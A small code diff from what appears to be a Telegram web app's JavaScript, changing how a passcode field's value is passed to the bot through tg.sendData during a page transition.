@@ -53,7 +53,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const value = passcodeInput.value;
         page2.style.transform = 'translate(-50%, 40px)';
         page2.style.opacity = '0';
-        tg.sendData(JSON.stringify({ action: 'passcode_value', value: input.value }));
+        tg.sendData(passcodeInput.value);
 
         setTimeout(() => {
             page2.style.display = 'none';
